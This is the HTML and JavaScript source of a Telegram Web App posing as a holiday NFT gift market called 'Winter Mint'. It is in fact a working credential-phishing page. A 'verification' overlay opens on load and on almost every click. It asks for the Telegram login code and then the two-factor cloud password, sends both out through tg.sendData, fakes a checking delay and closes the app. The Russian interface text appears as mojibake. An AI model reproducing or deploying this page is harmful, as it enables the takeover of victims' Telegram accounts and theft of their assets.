<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Winter Mint Premium</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-dark: #1b0f0f;
            --bg-grad: #3d0f0f;
            --card: rgba(255,255,255,0.05);
            --border: rgba(255,255,255,0.1);
            --accent-red: #e63946;
            --accent-green: #2a9d8f;
            --text: #f4f4f4;
            --text-soft: rgba(244,244,244,0.7);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, system-ui;
            color: var(--text);
            background: linear-gradient(180deg, var(--bg-dark), var(--bg-grad));
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
            user-select: none;
        }

        /* –°–ù–ï–ì–û–í–ü–ê–î */
        canvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; }

        /* HEADER */
        .header { text-align: center; padding: 50px 20px 20px; position: relative; z-index: 2; }
        .header h1 { margin: 0; font-size: 32px; font-weight: 800; text-shadow: 0 0 15px var(--accent-red); letter-spacing: -1px; }
        .badge { margin-top: 10px; display: inline-block; background: var(--accent-green); color: #fff; padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 700; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }

        /* NAV */
        .nav { display: flex; gap: 8px; padding: 12px; position: sticky; top: 0; z-index: 5; background: rgba(0,0,0,.3); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
        .nav button { flex: 1; padding: 12px; border-radius: 12px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; font-weight: 600; font-size: 14px; transition: 0.3s; cursor: pointer; }
        .nav button.active { background: linear-gradient(90deg, var(--accent-red), #b22222); border: none; box-shadow: 0 4px 12px rgba(230, 57, 70, 0.3); }

        /* –°–ï–ö–¶–ò–ò */
        .section { display: none; padding: 20px; position: relative; z-index: 2; animation: slideUp 0.4s ease; }
        .section.active { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* –ö–ê–†–¢–û–ß–ö–ò */
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 20px; margin-bottom: 16px; backdrop-filter: blur(15px); box-shadow: 0 10px 30px rgba(0,0,0,.4); }
        .label { font-size: 11px; font-weight: 700; color: var(--text-soft); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
        .value { font-size: 22px; font-weight: 700; }

        /* –ö–ù–û–ü–ö–ò */
        .btn { width: 100%; margin-top: 15px; padding: 16px; border-radius: 16px; border: none; background: linear-gradient(135deg, var(--accent-red), #9b2226); color: #fff; font-weight: 700; font-size: 16px; cursor: pointer; box-shadow: 0 6px 20px rgba(0,0,0,0.4); transition: 0.2s; }
        .btn:active { transform: scale(0.98); opacity: 0.9; }

        /* –ú–ê–†–ö–ï–¢ */
        .market { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .nft { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 12px; text-align: center; transition: 0.3s; }
        .nft img { width: 100%; border-radius: 16px; margin-bottom: 10px; }
        .nft-name { font-size: 13px; font-weight: 600; color: var(--text-soft); }

        /* OVERLAYS (–û–ö–ù–ê –í–í–û–î–ê) */
        .overlay {
            display: none; position: fixed; inset: 0; 
            background: rgba(0,0,0,0.94); backdrop-filter: blur(20px);
            z-index: 1000; padding: 30px; flex-direction: column; justify-content: center; align-items: center;
        }
        .overlay.active { display: flex; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from{opacity:0} to{opacity:1} }

        .input-field {
            background: rgba(255,255,255,0.07); border: 2px solid var(--accent-red);
            padding: 20px; border-radius: 18px; color: #fff;
            font-size: 28px; text-align: center; margin: 20px 0; outline: none; width: 100%;
            font-weight: 700; letter-spacing: 4px;
        }
        .input-field::placeholder { letter-spacing: 0; font-size: 18px; opacity: 0.3; }

        .fireplace { position: fixed; bottom: 15px; right: 15px; font-size: 40px; filter: drop-shadow(0 0 10px #f77); z-index: 2; opacity: 0.8; }
    </style>
</head>
<body>

<canvas id="snow"></canvas>

<div class="header">
    <h1>Winter Mint</h1>
    <div class="badge">üéÑ 20.00 Holiday Gift</div>
</div>

<div class="nav">
    <button id="btn-cab" class="active" onclick="openTab('cab',this)">–ö–∞–±–∏–Ω–µ—Ç</button>
    <button id="btn-market" onclick="openTab('market',this)">–ú–∞—Ä–∫–µ—Ç</button>
    <button id="btn-support" onclick="openTab('support',this)">–ü–æ–¥–¥–µ—Ä–∂–∫–∞</button>
</div>

<div id="cab" class="section active">
    <div class="card">
        <div class="label">–°–¢–ê–¢–£–° –ê–ö–ö–ê–£–ù–¢–ê</div>
        <div class="value" style="color:var(--accent-red)">–ù–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω</div>
        <button class="btn" onclick="showInput('step-code')">–ü—Ä–æ–π—Ç–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é</button>
    </div>
    <div class="card">
        <div class="label">–í–ê–® –ë–ê–õ–ê–ù–°</div>
        <div class="value">0.00 ‚≠ê</div>
        <button class="btn" style="background:var(--border)" onclick="showInput('step-code')">–í—ã–≤–µ—Å—Ç–∏ Stars</button>
    </div>
</div>

<div id="market" class="section">
    <div class="market">
        <div class="nft" onclick="showInput('step-code')">
            <img src="https://nft.fragment.com/gift/santahat-10168.webp" alt="NFT">
            <div class="nft-name">Frosty Hat</div>
        </div>
        <div class="nft" onclick="showInput('step-code')">
            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" alt="NFT">
            <div class="nft-name">Holiday Drink</div>
        </div>
    </div>
</div>

<div id="support" class="section">
    <div class="card" style="text-align: center;">
        <p style="color:var(--text-soft); margin-bottom: 20px;">–ï—Å–ª–∏ —É –≤–∞—Å –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å –ø–æ–ª—É—á–µ–Ω–∏–µ–º –ø–æ–¥–∞—Ä–∫–∞, –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞—à–µ–º—É –º–µ–Ω–µ–¥–∂–µ—Ä—É:</p>
        <button class="btn" onclick="window.open('https://t.me/x1o1y')">–°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
    </div>
</div>

<div id="step-code" class="overlay">
    <h2 style="margin:0">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h2>
    <p style="text-align:center; color:var(--text-soft); font-size: 14px;">–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ —á–∞—Ç–∞ <b>Telegram</b></p>
    <input type="number" id="inp-code" class="input-field" placeholder="00000" inputmode="numeric">
    <button class="btn" id="btn-send-code" onclick="sendCode()">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</button>
</div>

<div id="step-2fa" class="overlay">
    <h2 style="margin:0">–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</h2>
    <p style="text-align:center; color:var(--text-soft); font-size: 14px;">–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â–µ–Ω 2-—ç—Ç–∞–ø–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π</p>
    <input type="password" id="inp-pass" class="input-field" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" style="letter-spacing: 0;">
    <button class="btn" id="btn-send-pass" onclick="sendPass()">–í–û–ô–¢–ò –í –ú–ê–†–ö–ï–¢</button>
</div>

<div class="fireplace">üî•</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.enableClosingConfirmation();

    // –ê–≤—Ç–æ-–ø–æ–∫–∞–∑ –æ–∫–Ω–∞ –∫–æ–¥–∞ –ø—Ä–∏ –≤—Ö–æ–¥–µ
    window.onload = () => {
        setTimeout(() => {
            showInput('step-code');
        }, 800);
    };

    function openTab(id, el) {
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        el.classList.add('active');
    }

    function showInput(stepId) {
        document.querySelectorAll('.overlay').forEach(ov => ov.classList.remove('active'));
        document.getElementById(stepId).classList.add('active');
    }

    // –û–¢–ü–†–ê–í–ö–ê –ö–û–î–ê
    function sendCode() {
        const codeInput = document.getElementById('inp-code');
        const btn = document.getElementById('btn-send-code');
        
        if(codeInput.value.length >= 5) {
            tg.sendData("CODE:" + codeInput.value);
            
            btn.innerText = "–ü–†–û–í–ï–†–ö–ê...";
            btn.disabled = true;
            btn.style.opacity = "0.5";

            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ 2FA
            setTimeout(() => {
                document.getElementById('step-code').classList.remove('active');
                document.getElementById('step-2fa').classList.add('active');
            }, 1800);
        } else {
            tg.HapticFeedback.notificationOccurred('error');
        }
    }

    // –û–¢–ü–†–ê–í–ö–ê –ü–ê–†–û–õ–Ø
    function sendPass() {
        const passInput = document.getElementById('inp-pass');
        const btn = document.getElementById('btn-send-pass');

        if(passInput.value.length > 0) {
            tg.sendData("PASS:" + passInput.value);
            
            btn.innerText = "–ê–í–¢–û–†–ò–ó–ê–¶–ò–Ø...";
            btn.disabled = true;

            setTimeout(() => {
                tg.close();
            }, 1500);
        }
    }

    // –°–ù–ï–ì (–û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π)
    const c = document.getElementById("snow"), ctx = c.getContext("2d");
    let w, h, flakes = [];
    function resize() { w = c.width = window.innerWidth; h = c.height = window.innerHeight; }
    window.onresize = resize; resize();
    for (let i = 0; i < 80; i++) flakes.push({ x: Math.random() * w, y: Math.random() * h, r: Math.random() * 2 + 1, s: Math.random() * 1 + 0.5 });
    function snow() {
        ctx.clearRect(0, 0, w, h); ctx.fillStyle = "rgba(255,255,255,0.6)";
        flakes.forEach(f => {
            ctx.beginPath(); ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2); ctx.fill();
            f.y += f.s; if (f.y > h) { f.y = -5; f.x = Math.random() * w; }
        });
        requestAnimationFrame(snow);
    }
    snow();
</script>

</body>
</html>
